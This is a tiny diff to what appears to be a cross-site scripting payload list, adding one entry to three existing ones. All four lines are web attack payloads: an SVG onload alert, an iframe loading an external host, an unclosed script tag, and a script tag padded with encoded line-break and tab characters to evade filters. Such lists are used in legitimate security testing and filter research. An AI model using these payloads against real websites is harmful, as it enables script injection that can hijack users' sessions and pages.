@@ -1,3 +1,4 @@
 <svg/onload=alert()>
 <iframe src= //14.rs>
 <script>alert(1)</script
+<script>alert(1)%0d%0a-->%09</script
